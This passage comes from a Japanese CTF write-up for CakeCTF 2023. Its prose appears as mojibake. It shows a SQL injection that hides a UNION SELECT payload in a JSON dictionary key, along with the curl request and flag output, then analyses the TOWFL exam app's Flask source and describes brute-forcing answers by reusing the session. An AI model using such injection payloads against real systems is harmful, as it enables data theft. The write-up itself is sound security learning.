pythonã®ãƒªã‚¹ãƒˆã‚„è¾æ›¸ãªã©ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’format stringã‚’ç”¨ã„ã¦æ–‡å­—åˆ—ã«åŸ‹ã‚è¾¼ã‚€ã¨ã€æ¬¡ã®ã‚ˆã†ã«ãƒªã‚¹ãƒˆã‚„è¾æ›¸ã®ä¸­èº«ãŒå±•é–‹ã•ã‚ŒãŸçŠ¶æ…‹ã§æ–‡å­—åˆ—ã«åŸ‹ã‚è¾¼ã¾ã‚Œã¾ã™ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=o>&gt;&gt;&gt;</span> <span class=n>code</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;a&#34;</span><span class=p>:</span> <span class=mi>10</span><span class=p>,</span> <span class=s2>&#34;b&#34;</span><span class=p>:</span> <span class=mi>20</span><span class=p>}</span>
<span class=o>&gt;&gt;&gt;</span> <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;code = </span><span class=si>{</span><span class=n>code</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
<span class=n>code</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;a&#39;</span><span class=p>:</span> <span class=mi>10</span><span class=p>,</span> <span class=s1>&#39;b&#39;</span><span class=p>:</span> <span class=mi>20</span><span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p>ã¾ãŸã€pythonã®<code>len()</code>ãƒ¡ã‚½ãƒƒãƒ‰ã¯ãƒªã‚¹ãƒˆã€è¾æ›¸ã®é•·ã•ã‚’æ±‚ã‚ã‚‹ãŸã‚ã€ã©ã‚Œã ã‘é•·ã„æ–‡å­—åˆ—ã‚’å…¥åŠ›ã—ãŸã¨ã—ã¦ã‚‚ã€<code>code</code>ã®é•·ã•ã‚’è‡ªåˆ†ã§èª¿ç¯€ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã«ãªã‚Šã¾ã™ã€‚ï¼ˆä¸Šã®å ´åˆã€ã‚­ãƒ¼ã®æ–‡å­—åˆ—ã®é•·ã•ã‚’ã©ã‚Œã ã‘é•·ãã—ãŸã¨ã—ã¦ã‚‚ã€<code>len(a)</code>ã¯2ã®ã¾ã¾ã§ã™ï¼‰
ã“ã®ç‰¹æ€§ã‚’ã†ã¾ãä½¿ã£ã¦æ¬¡ã®ã‚ˆã†ãªSQLæ–‡ã‚’ä½œã‚ŠãŸã„ã§ã™ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=k>SELECT</span><span class=w> </span><span class=n>name</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>country</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>code</span><span class=o>=</span><span class=k>UPPER</span><span class=p>(</span><span class=s1>&#39;...&#39;</span><span class=p>)</span><span class=w> </span><span class=k>UNION</span><span class=w> </span><span class=k>SELECT</span><span class=w> </span><span class=n>flag</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>flag</span><span class=p>;</span><span class=w> </span><span class=c1>--
</span></code></pre></td></tr></table>
</div>
</div><p>ãã“ã§ã€<code>/api/search</code>ã«æ¬¡ã®ãƒ‡ãƒ¼ã‚¿ã‚’POSTã—ã¾ã™ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=p>{</span><span class=nt>&#34;code&#34;</span><span class=p>:</span> <span class=p>{</span><span class=nt>&#34;&#39;)UNION SELECT flag FROM flag; --&#34;</span><span class=p>:</span> <span class=mi>10</span><span class=p>,</span> <span class=nt>&#34;a&#34;</span><span class=p>:</span> <span class=mi>20</span><span class=p>}}</span>
</code></pre></td></tr></table>
</div>
</div><p>è©¦ã—ã«pythonã§å‹•ã‹ã—ã¦ã¿ã‚‹ã¨ã€æ¬¡ã®ã‚ˆã†ã«ãªã‚‹ãŸã‚ã€ã‚µãƒ¼ãƒãƒ¼ä¸Šã§ã¯flagã«ã¤ã„ã¦ã‚‚å•ã„åˆã‚ã›ã‚‹ã‚ˆã†ãªSQLæ–‡ã¨ã—ã¦è§£é‡ˆã•ã‚Œã‚‹ã¯ãšã§ã™ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=o>&gt;&gt;&gt;</span> <span class=n>code</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;&#39;)UNION SELECT flag FROM flag; --&#34;</span><span class=p>:</span> <span class=mi>10</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>:</span> <span class=mi>20</span><span class=p>}</span>
<span class=o>&gt;&gt;&gt;</span> <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;SELECT name FROM country WHERE code=UPPER(&#39;</span><span class=si>{</span><span class=n>code</span><span class=si>}</span><span class=s2>&#39;)&#34;</span><span class=p>)</span>
<span class=n>SELECT</span> <span class=n>name</span> <span class=n>FROM</span> <span class=n>country</span> <span class=n>WHERE</span> <span class=n>code</span><span class=o>=</span><span class=n>UPPER</span><span class=p>(</span><span class=s1>&#39;{&#34;&#39;</span><span class=p>)</span><span class=n>UNION</span> <span class=n>SELECT</span> <span class=n>flag</span> <span class=n>FROM</span> <span class=n>flag</span><span class=p>;</span> <span class=o>--</span><span class=s2>&#34;: 10, &#39;a&#39;: 20}&#39;)</span>
</code></pre></td></tr></table>
</div>
</div><p>ã“ã‚Œã‚’curlã§<code>/api/search</code>ã«POSTã™ã‚‹ã¨flagãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>vagrant@vagrant:~/repo/cakectf2023/web/towfl/service$ curl -X POST -H &#34;Content-Type: application/json&#34; -d &#34;{\&#34;code\&#34;: {\&#34;&#39;)UNION SELECT flag FROM flag; --\&#34;: 10, \&#34;a\&#34;: 20}}&#34; http://countrydb.2023.cakectf.com:8020/api/search
{&#34;name&#34;:&#34;CakeCTF{b3_c4refUl_wh3n_y0U_u5e_JS0N_1nPut}&#34;}
</code></pre></td></tr></table>
</div>
</div><p>ã‚ˆã£ã¦flagã¯<code>CakeCTF{b3_c4refUl_wh3n_y0U_u5e_JS0N_1nPut}</code>ã§ã™ã€‚</p>
<h3 id=towfl-cheat-web>TOWFL [cheat, web]</h3>
<p>é–‹å‚¬æœŸé–“ä¸­ã«è§£ã‘ãªã‹ã£ãŸå•é¡Œã§ã™ã€‚</p>
<p>å•é¡Œã‚µã‚¤ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã—Start Examã‚’æŠ¼ã™ã¨ã€ç‹¼èª(ï¼Ÿ)ã®ã¾ã‚‹ã§TOEFL(ã‚‚ã—ãã¯TOEIC)ã‹ã®ã‚ˆã†ãª4æŠå•é¡ŒãŒ10*10å•å‡ºé¡Œã•ã‚Œã¾ã™ã€‚ã“ã‚Œã§100ç‚¹ï¼ˆ1å•1ç‚¹ï¼‰ãŒå–ã‚Œã‚Œã°flagãŒå¾—ã‚‰ã‚Œã‚‹ã‚ˆã†ã§ã™ã€‚
ã‚µã‚¤ãƒˆã‚’æ§‹ç¯‰ã—ã¦ã„ã‚‹ã‚½ãƒ¼ã‚¹ãƒ•ã‚¡ã‚¤ãƒ«ç¾¤ã¯ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã£ã¦ã„ã¾ã™ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>.
â”œâ”€â”€ docker-compose.yml
â”œâ”€â”€ redis
â”‚   â”œâ”€â”€ Dockerfile
â”‚   â””â”€â”€ redis.conf
â””â”€â”€ service
    â”œâ”€â”€ app.py
    â”œâ”€â”€ Dockerfile
    â”œâ”€â”€ static
    â”‚   â”œâ”€â”€ fonts
    â”‚   â”‚   â””â”€â”€ hymmnos.ttf
    â”‚   â”œâ”€â”€ img
    â”‚   â”‚   â””â”€â”€ towfl.webp
    â”‚   â””â”€â”€ js
    â”‚       â””â”€â”€ script.js
    â”œâ”€â”€ templates
    â”‚   â””â”€â”€ index.html
    â””â”€â”€ uwsgi.ini
</code></pre></td></tr></table>
</div>
</div><p><code>app.py</code>ã‚’ç¢ºèªã™ã‚‹ã¨ã€4ã¤ã®ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆãŒã‚ã‚‹ã“ã¨ãŒåˆ†ã‹ã‚Šã¾ã™ã€‚</p>
<ul>
<li>POST <code>/api/start</code></li>
<li>GET <code>/api/question/&lt;int:qid></code></li>
<li>POST <code>/api/submit</code></li>
<li>GET <code>/api/score</code></li>
</ul>
<p>ãã‚Œãã‚Œæ¬¡ã®ã‚ˆã†ã«ãªã£ã¦ã„ã¾ã—ãŸã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=nd>@app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s2>&#34;/api/start&#34;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;POST&#39;</span><span class=p>])</span>
<span class=k>def</span> <span class=nf>api_start</span><span class=p>():</span>
    <span class=k>if</span> <span class=s1>&#39;eid&#39;</span> <span class=ow>in</span> <span class=n>flask</span><span class=o>.</span><span class=n>session</span><span class=p>:</span>
        <span class=n>eid</span> <span class=o>=</span> <span class=n>flask</span><span class=o>.</span><span class=n>session</span><span class=p>[</span><span class=s1>&#39;eid&#39;</span><span class=p>]</span>
    <span class=k>else</span><span class=p>:</span>
        <span class=n>eid</span> <span class=o>=</span> <span class=n>flask</span><span class=o>.</span><span class=n>session</span><span class=p>[</span><span class=s1>&#39;eid&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>urandom</span><span class=p>(</span><span class=mi>32</span><span class=p>)</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span>

    <span class=c1># Create new challenge set</span>
    <span class=n>db</span><span class=p>()</span><span class=o>.</span><span class=n>set</span><span class=p>(</span><span class=n>eid</span><span class=p>,</span> <span class=n>json</span><span class=o>.</span><span class=n>dumps</span><span class=p>([</span><span class=n>new_challenge</span><span class=p>()</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>10</span><span class=p>)]))</span>
    <span class=k>return</span> <span class=p>{</span><span class=s1>&#39;status&#39;</span><span class=p>:</span> <span class=s1>&#39;ok&#39;</span><span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p><code>/api/start</code>ã«POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ã‚‹ã¨ã€ãƒ©ãƒ³ãƒ€ãƒ ã§session id(<code>eid</code>)ã‚’ä»˜ä¸ã—ã€ã“ã®ç•ªå·ã‚’ä½¿ã£ã¦
redisãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«æ–°ã—ã„å•é¡Œã‚’ä½œæˆã—ã¾ã™ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=nd>@app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s2>&#34;/api/question/&lt;int:qid&gt;&#34;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>])</span>
<span class=k>def</span> <span class=nf>api_get_question</span><span class=p>(</span><span class=n>qid</span><span class=p>:</span> <span class=nb>int</span><span class=p>):</span>
    <span class=k>if</span> <span class=n>qid</span> <span class=o>&lt;=</span> <span class=mi>0</span> <span class=ow>or</span> <span class=n>qid</span> <span class=o>&gt;</span> <span class=mi>10</span><span class=p>:</span>
        <span class=k>return</span> <span class=p>{</span><span class=s1>&#39;status&#39;</span><span class=p>:</span> <span class=s1>&#39;error&#39;</span><span class=p>,</span> <span class=s1>&#39;reason&#39;</span><span class=p>:</span> <span class=s1>&#39;Invalid parameter.&#39;</span><span class=p>}</span>
    <span class=k>elif</span> <span class=s1>&#39;eid&#39;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>flask</span><span class=o>.</span><span class=n>session</span><span class=p>:</span>
        <span class=k>return</span> <span class=p>{</span><span class=s1>&#39;status&#39;</span><span class=p>:</span> <span class=s1>&#39;error&#39;</span><span class=p>,</span> <span class=s1>&#39;reason&#39;</span><span class=p>:</span> <span class=s1>&#39;Exam has not started yet.&#39;</span><span class=p>}</span>

    <span class=c1># Send challenge information without answers</span>
    <span class=n>chall</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>db</span><span class=p>()</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>flask</span><span class=o>.</span><span class=n>session</span><span class=p>[</span><span class=s1>&#39;eid&#39;</span><span class=p>]))[</span><span class=n>qid</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
    <span class=k>del</span> <span class=n>chall</span><span class=p>[</span><span class=s1>&#39;answers&#39;</span><span class=p>]</span>
    <span class=k>del</span> <span class=n>chall</span><span class=p>[</span><span class=s1>&#39;results&#39;</span><span class=p>]</span>
    <span class=c1># challã®æƒ…å ±å–ã£ã¦ã“ã‚Œã‚‹ãŒ, answers, resultsãŒæ¶ˆãˆãŸã‚‚ã®ãŒè¿”ã£ã¦ãã‚‹</span>
    <span class=k>return</span> <span class=p>{</span><span class=s1>&#39;status&#39;</span><span class=p>:</span> <span class=s1>&#39;ok&#39;</span><span class=p>,</span> <span class=s1>&#39;data&#39;</span><span class=p>:</span> <span class=n>chall</span><span class=p>}</span> 
</code></pre></td></tr></table>
</div>
</div><p><code>/api/question/&lt;int:qid></code>ã«1ã‹ã‚‰10ã¾ã§ã®ç•ªå·ã‚’æŒ‡å®šã—ã¦GETãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ã‚‹ã¨ã€
æŒ‡å®šã—ãŸå¤§å•ã®å•é¡Œæƒ…å ±ãŒè¿”ã£ã¦ãã¾ã™ã€‚ãŸã ã—ã€ç­”ãˆã¨çµæœã®æƒ…å ±ã¯æ¶ˆã•ã‚ŒãŸã‚‚ã®ã«ãªã‚Šã¾ã™ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=nd>@app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s2>&#34;/api/submit&#34;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;POST&#39;</span><span class=p>])</span>
<span class=k>def</span> <span class=nf>api_submit</span><span class=p>():</span>
    <span class=k>if</span> <span class=s1>&#39;eid&#39;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>flask</span><span class=o>.</span><span class=n>session</span><span class=p>:</span>
        <span class=k>return</span> <span class=p>{</span><span class=s1>&#39;status&#39;</span><span class=p>:</span> <span class=s1>&#39;error&#39;</span><span class=p>,</span> <span class=s1>&#39;reason&#39;</span><span class=p>:</span> <span class=s1>&#39;Exam has not started yet.&#39;</span><span class=p>}</span>

    <span class=k>try</span><span class=p>:</span>
        <span class=n>answers</span> <span class=o>=</span> <span class=n>flask</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>get_json</span><span class=p>()</span> <span class=c1># ã“ã“ãŒå…¥åŠ›(äºŒæ¬¡å…ƒã®ãƒªã‚¹ãƒˆ)</span>
    <span class=k>except</span><span class=p>:</span>
        <span class=k>return</span> <span class=p>{</span><span class=s1>&#39;status&#39;</span><span class=p>:</span> <span class=s1>&#39;error&#39;</span><span class=p>,</span> <span class=s1>&#39;reason&#39;</span><span class=p>:</span> <span class=s1>&#39;Invalid request. 1&#39;</span><span class=p>}</span>

    <span class=nb>print</span><span class=p>(</span><span class=n>answers</span><span class=p>)</span>
    <span class=c1># Get answers</span>
    <span class=n>eid</span> <span class=o>=</span> <span class=n>flask</span><span class=o>.</span><span class=n>session</span><span class=p>[</span><span class=s1>&#39;eid&#39;</span><span class=p>]</span>
    <span class=n>challs</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>db</span><span class=p>()</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>eid</span><span class=p>))</span>
    <span class=k>if</span> <span class=ow>not</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>answers</span><span class=p>,</span> <span class=nb>list</span><span class=p>)</span> \
       <span class=ow>or</span> <span class=nb>len</span><span class=p>(</span><span class=n>answers</span><span class=p>)</span> <span class=o>!=</span> <span class=nb>len</span><span class=p>(</span><span class=n>challs</span><span class=p>):</span>
        <span class=k>return</span> <span class=p>{</span><span class=s1>&#39;status&#39;</span><span class=p>:</span> <span class=s1>&#39;error&#39;</span><span class=p>,</span> <span class=s1>&#39;reason&#39;</span><span class=p>:</span> <span class=s1>&#39;Invalid request. 2&#39;</span><span class=p>}</span>

    <span class=c1># Check answers</span>
    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>answers</span><span class=p>)):</span>
        <span class=k>if</span> <span class=ow>not</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>answers</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=nb>list</span><span class=p>)</span> \
           <span class=ow>or</span> <span class=nb>len</span><span class=p>(</span><span class=n>answers</span><span class=p>[</span><span class=n>i</span><span class=p>])</span> <span class=o>!=</span> <span class=nb>len</span><span class=p>(</span><span class=n>challs</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=s1>&#39;answers&#39;</span><span class=p>]):</span>
            <span class=k>return</span> <span class=p>{</span><span class=s1>&#39;status&#39;</span><span class=p>:</span> <span class=s1>&#39;error&#39;</span><span class=p>,</span> <span class=s1>&#39;reason&#39;</span><span class=p>:</span> <span class=s1>&#39;Invalid request.&#39;</span><span class=p>}</span>

        <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>answers</span><span class=p>[</span><span class=n>i</span><span class=p>])):</span>
            <span class=nb>print</span><span class=p>(</span><span class=nb>type</span><span class=p>(</span><span class=n>challs</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=s2>&#34;answers&#34;</span><span class=p>][</span><span class=n>j</span><span class=p>]))</span>
            <span class=n>challs</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=s1>&#39;results&#39;</span><span class=p>][</span><span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=n>answers</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=n>j</span><span class=p>]</span> <span class=o>==</span> <span class=n>challs</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=s1>&#39;answers&#39;</span><span class=p>][</span><span class=n>j</span><span class=p>]</span> <span class=c1># resultsã«å¤‰æ›´ã‚’ä¸ãˆã¦ã„ã‚‹ã®ã¯ã“ã“</span>

    <span class=c1># Store information with results</span>
    <span class=n>db</span><span class=p>()</span><span class=o>.</span><span class=n>set</span><span class=p>(</span><span class=n>eid</span><span class=p>,</span> <span class=n>json</span><span class=o>.</span><span class=n>dumps</span><span class=p>(</span><span class=n>challs</span><span class=p>))</span>
    <span class=k>return</span> <span class=p>{</span><span class=s1>&#39;status&#39;</span><span class=p>:</span> <span class=s1>&#39;ok&#39;</span><span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p><code>/api/submit</code>ã§jsonã¨ã—ã¦10*10ã®ãƒªã‚¹ãƒˆã‚’POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã«ã‚ˆã‚Šé€ã‚‹ã¨ã€ã“ã®ãƒªã‚¹ãƒˆã¨redisã«ä¿å­˜ã•ã‚ŒãŸå•é¡Œæƒ…å ±ã‹ã‚‰ç­”ãˆã‚’æ¯”è¼ƒã—ã¦çµæœã‚’challsã®resultsã«ä¿å­˜ã—ã¾ã™ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=nd>@app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s2>&#34;/api/score&#34;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>])</span>
<span class=k>def</span> <span class=nf>api_score</span><span class=p>():</span>
    <span class=k>if</span> <span class=s1>&#39;eid&#39;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>flask</span><span class=o>.</span><span class=n>session</span><span class=p>:</span>
        <span class=k>return</span> <span class=p>{</span><span class=s1>&#39;status&#39;</span><span class=p>:</span> <span class=s1>&#39;error&#39;</span><span class=p>,</span> <span class=s1>&#39;reason&#39;</span><span class=p>:</span> <span class=s1>&#39;Exam has not started yet.&#39;</span><span class=p>}</span>

    <span class=c1># Calculate score</span>
    <span class=n>challs</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>db</span><span class=p>()</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>flask</span><span class=o>.</span><span class=n>session</span><span class=p>[</span><span class=s1>&#39;eid&#39;</span><span class=p>]))</span>
    <span class=n>score</span> <span class=o>=</span> <span class=mi>0</span>
    <span class=k>for</span> <span class=n>chall</span> <span class=ow>in</span> <span class=n>challs</span><span class=p>:</span>
        <span class=k>for</span> <span class=n>result</span> <span class=ow>in</span> <span class=n>chall</span><span class=p>[</span><span class=s1>&#39;results&#39;</span><span class=p>]:</span>
            <span class=k>if</span> <span class=n>result</span> <span class=ow>is</span> <span class=kc>True</span><span class=p>:</span>
                <span class=n>score</span> <span class=o>+=</span> <span class=mi>1</span>

    <span class=c1># Is he/she worth giving the flag?</span>
    <span class=k>if</span> <span class=n>score</span> <span class=o>==</span> <span class=mi>100</span><span class=p>:</span>
        <span class=n>flag</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;FLAG&#34;</span><span class=p>)</span> <span class=c1># ã†ã¾ã„ã“ã¨100ã«ã™ã‚Œã°ã„ã„ã®ã‹ãª</span>
    <span class=k>else</span><span class=p>:</span>
        <span class=n>flag</span> <span class=o>=</span> <span class=s2>&#34;Get perfect score for flag&#34;</span>

    <span class=c1># Prevent reply attack</span>
    <span class=n>flask</span><span class=o>.</span><span class=n>session</span><span class=o>.</span><span class=n>clear</span><span class=p>()</span>

    <span class=k>return</span> <span class=p>{</span><span class=s1>&#39;status&#39;</span><span class=p>:</span> <span class=s1>&#39;ok&#39;</span><span class=p>,</span> <span class=s1>&#39;data&#39;</span><span class=p>:</span> <span class=p>{</span><span class=s1>&#39;score&#39;</span><span class=p>:</span> <span class=n>score</span><span class=p>,</span> <span class=s1>&#39;flag&#39;</span><span class=p>:</span> <span class=n>flag</span><span class=p>}}</span>
</code></pre></td></tr></table>
</div>
</div><p><code>/api/score</code>ã«GETãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ã‚‹ã¨ã€redisã«ä¿å­˜ã•ã‚ŒãŸchallsã®resultsã‹ã‚‰æ­£ç­”æ•°ã‚’è¨ˆç®—ã—ã€
ã‚¹ã‚³ã‚¢æƒ…å ±ã¨ã€ã‚‚ã—ã‚‚100ç‚¹ãªã‚‰flagãŒã€ãã†ã§ãªã‘ã‚Œã°"Get perfect score for flag"ãŒè¿”ã•ã‚Œã¾ã™ã€‚</p>
<p>é–‹å‚¬æœŸé–“ä¸­ã¯ã‚‚ã—ã‹ã—ãŸã‚‰pythonã®ç­‰ä¾¡æ¼”ç®—å­ã«ä½•ã‹ã—ã‚‰ã®ç‰¹æ€§ãŒã‚ã‚Šã€å…¨ã¦ã®intå‹ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«å¯¾ã—ã¦
é€éã«ãªã‚‹ã‚ˆã†ãªã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒã‚ã‚‹ã®ã‹ã‚‚ã—ã‚Œãªã„ã¨æ€ã„èª¿ã¹ã¦ã„ã¾ã—ãŸãŒé•ã£ãŸã‚ˆã†ã§ã™ã€‚</p>
<p>ã¾ãšã¯ã˜ã‚ã«ã€redisãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã¯session idã‚’ç”¨ã„ã¦å„å€‹äººã®å•é¡Œæƒ…å ±ãŠã‚ˆã³çµæœã‚’ç®¡ç†ã—ã¦ã„ã¾ã™ã€‚
ã™ãªã‚ã¡ã€session idã‚’ãƒ¦ãƒ¼ã‚¶ãƒ¼å´ã§ç®¡ç†ã—ã¦ãŠã‘ã°ã€ä½•åº¦ã‚‚å›ç­”ã‚’å¤‰æ›´ã—ã¦ç­”ãˆã®ç¢ºèªã‚’ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
æ¬¡ã«ã€å•é¡Œæ•°ã¯10*10ã§é¸æŠè‚¢ã¯å…¨ã¦4ã¤ã§ã™ã€‚é€šå¸¸ã€ã‚¹ã‚³ã‚¢ãŒåˆ†ã‹ã‚‰ãªã„ã¨ã€$4^{10\times 10} = 1606938044258990275541962092341162602522202993782792835301376$é€šã‚Šã«ãªã‚Šç·å½“ãŸã‚Šã¯ä¸å¯èƒ½ã§ã™ã€‚ã—ã‹ã—ã€ä»Šå›ã¯session idã‚’è‡ªåˆ†ã§ç®¡ç†ã™ã‚Œã°<code>/api/score</code>ã«ã‚ˆã£ã¦ç¾åœ¨ã®ã‚¹ã‚³ã‚¢çŠ¶æ³ãŒç¢ºèªã§ãã‚‹ãŸã‚ã€æœ€æ‚ªã®å ´åˆã§ã‚‚$10\times 10\times 4 = 400$é€šã‚Šã§100ç‚¹ã‚’å‡ºã™ã“ã¨ãŒã§ãã¾ã™ã€‚
